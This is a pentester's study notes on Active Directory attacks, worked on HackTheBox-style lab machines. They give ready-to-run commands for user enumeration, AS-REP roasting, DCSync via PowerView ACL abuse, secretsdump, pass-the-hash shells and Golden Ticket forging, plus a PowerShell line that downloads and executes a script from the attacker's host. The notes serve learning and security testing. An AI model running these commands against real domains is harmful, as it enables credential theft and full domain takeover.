# Active Directory — Concept Notes

**By Stager** | FashilHack

---

These are my personal notes on Active Directory concepts, attacks, and tools learned while working through AD machines. Separate from any specific machine writeup.

---

## LDAP Enumeration

LDAP is the protocol Active Directory uses to store and serve directory information. You can query it anonymously on older or misconfigured domains.

```bash
# Confirm domain naming context (use when you don't know the DC name)
ldapsearch -H ldap://10.10.10.1 -x -s base namingcontext

# Pull all users from the domain
ldapsearch -H ldap://10.10.10.1 -x -b "DC=htb,DC=local" '(objectClass=)' 'sAMAccountName' | grep sAMAccountName
```

---

## RPC Enumeration

RPC can give you users that LDAP misses. Anonymous login works on older domains.

```bash
rpcclient -U "" -N 10.10.10.1
```

Inside rpcclient:
```
enumdomusers              # list all domain users
queryusergroups <rid>     # what groups is a user in (by their RID)
querygroup <rid>          # name of a group by RID
queryuser <rid>           # user details — password last set, must change flag
```

The password last set date matters for password spraying. Accounts with very old passwords or forced resets behave differently and may be easier targets.

---

## Password Policy — Check Before Brute Force

**Always check the password policy before spraying or brute forcing.** Lockout thresholds will lock accounts and alert defenders.

```bash
crackmapexec smb 10.10.10.1 --pass-pol
crackmapexec smb 10.10.10.1 --pass-pol -u '' -p ''
```

Null authentication working is itself a reportable finding. Old domains allow it. Fresh Windows Server 2016 installs require credentials.

---

## AS-REP Roasting

**What it is:** Some accounts have Kerberos pre-authentication disabled. When pre-auth is off, anyone can request an encrypted TGT for that account without providing a password. The response contains a hash you can crack offline.

**Who is vulnerable:** Usually service accounts or misconfigured user accounts.

```bash
# Request hashes for all vulnerable accounts
impacket-GetNPUsers -dc-ip 10.10.10.1 -request 'htb.local/' -format hashcat

# Save the hash and crack it
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt

# Find the right hashcat mode
hashcat --example-hashes | grep -i krb
```

The hash starts with `$krb5asrep$` — mode 18200 in hashcat.

---

## Evil-WinRM

WinRM runs on port 5985. If you have credentials and WinRM is open you can get a PowerShell shell.

```bash
evil-winrm -u username -p password -i 10.10.10.1
evil-winrm -u username -H <ntlm_hash> -i 10.10.10.1
```

---

## Transferring Files — Kali SMB Share to Windows Shell

**Method 1 — net use (quick and simple):**

On Kali:
```bash
impacket-smbserver share $(pwd) -smb2support -u stager -password Password123
```

On Windows shell:
```powershell
net use \\10.10.14.x\share /u:stager Password123
cd \\10.10.14.x\share
.\winPEAS.exe
```

**Method 2 — New-PSDrive (PowerShell native, stealthier):**

On Windows shell:
```powershell
$pass = convertto-securestring 'Password123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('stager', $pass)
New-PSDrive -Name myshare -PSProvider FileSystem -Credential $cred -Root \\10.10.14.x\share
cd myshare:
.\winPEAS.exe
```

| Feature | net use | New-PSDrive |
|---|---|---|
| Style | Classic Windows | PowerShell native |
| Credentials | Inline plaintext | Secure object |
| Stealth | Lower | Higher |
| End result | Access UNC path | Virtual drive letter |

Both do the same thing. net use is faster, New-PSDrive is cleaner.

---

## BloodHound

BloodHound maps Active Directory relationships and shows attack paths visually. Run SharpHound on the victim, import the data into BloodHound on Kali.

```bash
# On victim (Windows shell)
.\sharphound.exe -c all

# On Kali
neo4j console          # start the database
bloodhound --no-sandbox
```

Upload the SharpHound zip file. Use the built-in queries to find:
- Shortest path to Domain Admin
- Users with DCSync rights
- Kerberoastable accounts
- AS-REP Roastable accounts

When BloodHound shows a path — click the edge (the arrow between nodes) to see the Abuse tab. It tells you exactly how to exploit that relationship.

---

## WriteDACL — What it Means

DACL = Discretionary Access Control List. It controls who can do what to an AD object.

**WriteDACL permission** on an object means you can modify its permissions — you can add any right you want to any account.

**WriteDACL on the domain object** is the most dangerous. It lets you grant yourself DCSync rights, which means you can dump every password hash in the domain.

The Exchange Windows Permissions group commonly has WriteDACL on the domain in many AD environments — this is a known privilege escalation path.

---

## PowerView — Granting DCSync Rights

PowerView is part of PowerSploit. Use it to modify AD ACLs from a compromised shell.

```bash
# Download PowerView to victim from your Kali server
python3 -m http.server 80   # on Kali in PowerSploit/Recon directory
```

```powershell
# On victim shell — download and run PowerView
powershell -c IEX(New-Object Net.WebClient).downloadstring("http://10.10.14.x/powerview.ps1")

# Build credential object for your user
$pass = convertto-securestring 'YourPassword' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\yourusername', $pass)

# Grant DCSync rights
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity yourusername -Rights DCSync
```

If it doesn't work first time try running the credential commands again in a fresh shell and retry. Sometimes the rights take a moment to propagate.

---

## DCSync Attack

**What it is:** DCSync abuses the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights to impersonate a Domain Controller and request password hashes from another DC. You don't need to be on the DC — you just need those rights.

```bash
impacket-secretsdump htb.local/yourusername:YourPassword@10.10.10.1
```

This dumps NTLM hashes for every account in the domain including Administrator and krbtgt.

Save all hashes to a file. The important ones:
- **Administrator hash** — for Pass-the-Hash
- **krbtgt hash** — for Golden Ticket attacks

---

## Pass-the-Hash

In Windows authentication NTLM hashes are used directly. You don't always need to crack them — you can authenticate with the hash itself.

```bash
# Check if it works
crackmapexec smb 10.10.10.1 -u administrator -H <ntlm_hash>

# Get a shell
impacket-psexec -hashes :<ntlm_hash> administrator@10.10.10.1
impacket-wmiexec -hashes :<ntlm_hash> administrator@10.10.10.1
```

psexec gives you SYSTEM. wmiexec gives you Administrator. Both work.

---

## Golden Ticket Attack

**What it is:** A Golden Ticket is a forged Kerberos TGT (Ticket Granting Ticket) signed with the krbtgt account's NTLM hash. Since Domain Controllers trust any ticket signed by krbtgt, a forged ticket lets you impersonate any user with any privilege — indefinitely.

**Why it's powerful:**
- Doesn't expire (you can set 10 year validity)
- Works even after password resets
- Only defense is resetting krbtgt hash twice

**What you need:**
- krbtgt NTLM hash (from secretsdump)
- Domain SID

```bash
# Get domain SID from Windows shell
Get-ADDomain htb.local   # copy the SID
whoami /user             # also shows your SID — trim the last part for domain SID
```

**On Linux with Impacket:**
```bash
# Generate the ticket
python ticketer.py -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain htb.local administrator

# Set the ticket for use
export KRB5CCNAME=administrator.ccache

# Use it
impacket-psexec htb.local/administrator@FOREST -k -no-pass
```

If you get a clock skew error:
```bash
sudo apt install ntpdate
sudo ntpdate 10.10.10.1
```

If you get server not found error — use the DNS hostname of the machine instead of IP in the psexec command.

When using psexec with Kerberos you get SYSTEM. When using wmiexec you get Administrator.

---

## SIDs and RIDs Explained

**SID = Security Identifier** — unique ID for every user, group, and object in AD.

Example SID:
```
S-1-5-21-123456789-234567890-345678901-500
```

- `S-1-5-21` = standard prefix for domain accounts
- `123456789-234567890-345678901` = domain identifier (unique per domain)
- `500` = RID (Relative Identifier) — the last number

**Well-known RIDs (same on every Windows domain):**

| Account | RID |
|---|---|
| Administrator | 500 |
| Guest | 501 |
| krbtgt | 502 |
| Domain Admins | 512 |
| Domain Users | 513 |
| Enterprise Admins | 519 |

When forging a Golden Ticket you specify the domain SID plus the RID of who you want to be. Tools use these well-known RIDs to know which account to impersonate.

---

## Standard AD Enumeration Checklist

Do these in order every time you hit an AD machine:

```
1. nmap            → confirm DC ports (88, 389, 5985)
2. SMB             → smbclient -L (anonymous shares)
3. LDAP            → ldapsearch (pull users)
4. RPC             → rpcclient enumdomusers (extra users, group info)
5. Password policy → crackmapexec --pass-pol (before any brute force)
6. AS-REP Roast    → impacket-GetNPUsers (no creds needed)
7. Kerberoast      → impacket-GetUserSPNs (need creds)
8. Crack hashes    → hashcat
9. Shell           → evil-winrm
10. BloodHound     → sharphound → find attack paths
11. PowerView      → abuse ACL paths found in BloodHound
12. secretsdump    → DCSync → dump all hashes
13. PtH / Golden   → full domain compromise
```

---

_Stager — FashilHack — Simulating Attacks, Securing Businesses._